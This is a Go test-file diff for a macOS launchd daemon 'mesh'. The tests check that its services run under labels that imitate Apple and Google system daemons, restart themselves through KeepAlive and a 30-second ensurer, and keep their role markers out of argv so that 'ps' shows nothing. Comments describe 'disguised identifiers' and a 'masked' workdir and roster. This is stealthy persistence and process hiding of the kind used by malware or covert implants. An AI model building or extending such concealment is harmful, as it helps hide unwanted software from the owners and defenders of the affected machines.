@@ -21,16 +21,28 @@ func TestPlistWorkerVsEnsurer(t *testing.T) {
 	if !strings.Contains(a, "<key>KeepAlive</key><true/>") {
 		t.Fatal("worker must have KeepAlive")
 	}
-	if !strings.Contains(a, "<string>run</string>") || !strings.Contains(a, "<string>--mesh</string>") {
-		t.Fatal("worker args must include run + --mesh")
+	// FEATURE 19: the PROD worker carries NO run/--mesh in argv — the marker
+	// rides in EnvironmentVariables (MeshEnvKey="run:a"), hidden from `ps`.
+	if strings.Contains(a, "<string>run</string>") || strings.Contains(a, "<string>--mesh</string>") {
+		t.Fatalf("worker argv must NOT carry run/--mesh (FEATURE 19):\n%s", a)
+	}
+	if !strings.Contains(a, "<key>EnvironmentVariables</key><dict>") ||
+		!strings.Contains(a, "<key>"+MeshEnvKey+"</key><string>run:a</string>") {
+		t.Fatalf("worker must carry the mesh marker in env (MeshEnvKey=run:a):\n%s", a)
 	}
 	if strings.Contains(a, "StartInterval") {
 		t.Fatal("worker must NOT have StartInterval")
 	}
 
 	e := Plist(s, RoleEnsure)
-	if !strings.Contains(e, "<string>ensure</string>") {
-		t.Fatal("ensurer must run the ensure subcommand")
+	// FEATURE 19: the ensurer subcommand also moves into env (MeshEnvKey=ensure);
+	// argv is the binary alone. Scope the argv check to ProgramArguments — the
+	// env dict legitimately holds the value "ensure".
+	if strings.Contains(programArgsBlock(t, e), "<string>ensure</string>") {
+		t.Fatalf("ensurer argv must NOT carry the ensure subcommand (FEATURE 19):\n%s", e)
+	}
+	if !strings.Contains(e, "<key>"+MeshEnvKey+"</key><string>ensure</string>") {
+		t.Fatalf("ensurer must carry the ensure marker in env:\n%s", e)
 	}
 	if !strings.Contains(e, "<key>StartInterval</key><integer>30</integer>") {
 		t.Fatalf("ensurer StartInterval wrong:\n%s", e)
@@ -40,12 +52,14 @@ func TestPlistWorkerVsEnsurer(t *testing.T) {
 	}
 }
 
-// TestPlistProdArgvMinimized asserts FEATURE 14 / ADR-0018: a PROD mesh
-// plist's argv is reduced to role + mesh marker and NONE of the disguised
-// identifiers (the three roster labels — the bootout keys — plus --github,
-// --asset, --interval, --workdir, --test-mode-flag). The masked workdir
-// file, not argv, is the single source of truth for the labels.
-func TestPlistProdArgvMinimized(t *testing.T) {
+// TestPlistProdArgvEmptyMarkerInEnv asserts FEATURE 19 / ADR-0018: a PROD mesh
+// plist's argv is now EMPTY (the binary alone) — even the role/mesh marker
+// FEATURE 14 had kept (`run --r <role> --mesh` / `ensure`) is gone from the
+// command line. The marker rides in EnvironmentVariables (MeshEnvKey), and NONE
+// of the disguised identifiers (the roster labels, --github/--asset/--interval/
+// --workdir/--test-mode-flag) appear in argv. So `ps aux | grep mesh` finds
+// nothing for the live mesh.
+func TestPlistProdArgvEmptyMarkerInEnv(t *testing.T) {
 	roster := []string{
 		"com.apple.metadata.helper.7f3a2c11ab",
 		"com.google.keystone.daemon.8c1f4e9d22",
@@ -55,40 +69,103 @@ func TestPlistProdArgvMinimized(t *testing.T) {
 		Github: "o/r", Asset: "platform-darwin-arm64",
 		Interval: 10 * time.Second, Roster: roster}
 
-	// Forbidden tokens: the leak FEATURE 14 closes. The three labels are
-	// the worst (bootout keys); the rest each narrow the search. We scan the
-	// ProgramArguments (what `ps` shows), NOT the plist Label key — the
-	// launchd Label legitimately carries the disguised name on disk (that is
-	// FEATURE 10's masked-roster concern, not this feature's argv concern).
-	forbidden := []string{
-		"--roster", "--github", "--asset", "--interval",
-		"--workdir", "--test-mode-flag", "/wd", "o/r",
-		"platform-darwin-arm64",
-	}
-	forbidden = append(forbidden, roster...)
-
+	// PROD argv (the strings after the binary) must be EMPTY for every role —
+	// no run/--mesh/ensure marker, no disguised identifiers at all.
 	for _, r := range AllRoles {
-		argv := args(s, r)
-		for _, tok := range forbidden {
-			for _, a := range argv {
-				if a == tok {
-					t.Errorf("%s prod argv leaks %q: %v", r, tok, argv)
-				}
+		if got := args(s, r); len(got) != 0 {
+			t.Errorf("%s prod argv must be empty (FEATURE 19), got %v", r, got)
+		}
+	}
+
+	// The marker moved into env: workers → run:<role>, ensurer → ensure.
+	wantEnv := map[Role]string{RoleA: "run:a", RoleB: "run:b", RoleEnsure: "ensure"}
+	for r, want := range wantEnv {
+		kvs := env(s, r)
+		if len(kvs) != 1 || kvs[0].Key != MeshEnvKey || kvs[0].Value != want {
+			t.Errorf("%s env = %v, want [{%s %s}]", r, kvs, MeshEnvKey, want)
+		}
+	}
+
+	// And `ps` (the ProgramArguments array — NOT the env dict, which ps does
+	// not display) shows no mesh tell. Scope the scan to the ProgramArguments
+	// block: the env VALUE "ensure"/"run:a" legitimately lives in the env dict.
+	for _, r := range AllRoles {
+		pa := programArgsBlock(t, Plist(s, r))
+		for _, tok := range []string{"--mesh", "<string>run</string>", "<string>ensure</string>"} {
+			if strings.Contains(pa, tok) {
+				t.Errorf("%s ProgramArguments leaks %q (FEATURE 19):\n%s", r, tok, pa)
 			}
 		}
 	}
+}
 
-	// Workers carry exactly: run --r <role> --mesh.
-	for _, r := range []Role{RoleA, RoleB} {
-		got := args(s, r)
-		want := []string{"run", "--r", string(r), "--mesh"}
-		if !equalArgs(got, want) {
-			t.Errorf("%s worker argv = %v, want %v", r, got, want)
+// programArgsBlock returns the <key>ProgramArguments</key><array>…</array>
+// substring of a rendered plist — what `ps` would surface — so a test can scan
+// argv without matching the EnvironmentVariables dict.
+func programArgsBlock(t *testing.T, plist string) string {
+	t.Helper()
+	const head = "<key>ProgramArguments</key><array>"
+	i := strings.Index(plist, head)
+	if i < 0 {
+		t.Fatalf("plist has no ProgramArguments:\n%s", plist)
+	}
+	rest := plist[i:]
+	end := strings.Index(rest, "</array>")
+	if end < 0 {
+		t.Fatalf("plist ProgramArguments not closed:\n%s", plist)
+	}
+	return rest[:end]
+}
+
+// TestArgvFromEnvRoundTrip asserts the CRITICAL invariant: the env value env()
+// bakes for each role decodes EXACTLY back to the legacy subcommand argv the
+// daemon's dispatch expects. A mismatch would mean a prod launchd start (which
+// reconstructs argv from env) mis-dispatches or falls through to usage() and
+// crash-loops under KeepAlive.
+func TestArgvFromEnvRoundTrip(t *testing.T) {
+	s := Spec{Mode: mode.User, SelfPath: "/d/daemon", Workdir: "/wd", Roster: []string{"x", "y", "z"}}
+	want := map[Role][]string{
+		RoleA:      {"run", "--r", "a", "--mesh"},
+		RoleB:      {"run", "--r", "b", "--mesh"},
+		RoleEnsure: {"ensure"},
+	}
+	for _, r := range AllRoles {
+		kvs := env(s, r)
+		if len(kvs) != 1 {
+			t.Fatalf("%s: want exactly one env entry, got %v", r, kvs)
+		}
+		got := decodeMeshEnv(kvs[0].Value)
+		if !equalArgs(got, want[r]) {
+			t.Errorf("%s round-trip: decodeMeshEnv(%q) = %v, want %v", r, kvs[0].Value, got, want[r])
 		}
 	}
-	// Ensurer carries exactly: ensure.
-	if got := args(s, RoleEnsure); !equalArgs(got, []string{"ensure"}) {
-		t.Errorf("ensurer argv = %v, want [ensure]", got)
+}
+
+// TestDecodeMeshEnvSafeOnGarbage asserts a bad/missing env value yields NO
+// synthesized argv (nil) — never a partial argv that could mis-dispatch. The
+// caller then falls through to usage() rather than respawning into a wrong
+// subcommand.
+func TestDecodeMeshEnvSafeOnGarbage(t *testing.T) {
+	// Strict inverse of encodeRole: only "ensure" / "run:a" / "run:b" decode.
+	// Any unknown role ("run:a:b", "run:zzz") yields nil so a bad value can
+	// never synthesize a partial argv that mis-dispatches into a crash-loop.
+	for _, v := range []string{"", "run:", "run", "ensur", "garbage", "RUN:A", ":a", "run:a:b", "run:zzz"} {
+		if got := decodeMeshEnv(v); got != nil {
+			t.Errorf("decodeMeshEnv(%q) = %v, want nil", v, got)
+		}
+	}
+}
+
+// TestArgvFromEnvReadsProcessEnv exercises the os.Getenv path used by the prod
+// entrypoint when launchd starts the binary with an empty argv.
+func TestArgvFromEnvReadsProcessEnv(t *testing.T) {
+	t.Setenv(MeshEnvKey, "run:b")
+	if got := ArgvFromEnv(); !equalArgs(got, []string{"run", "--r", "b", "--mesh"}) {
+		t.Fatalf("ArgvFromEnv = %v, want [run --r b --mesh]", got)
+	}
+	t.Setenv(MeshEnvKey, "")
+	if got := ArgvFromEnv(); got != nil {
+		t.Fatalf("ArgvFromEnv with empty var = %v, want nil", got)
 	}
 }
 
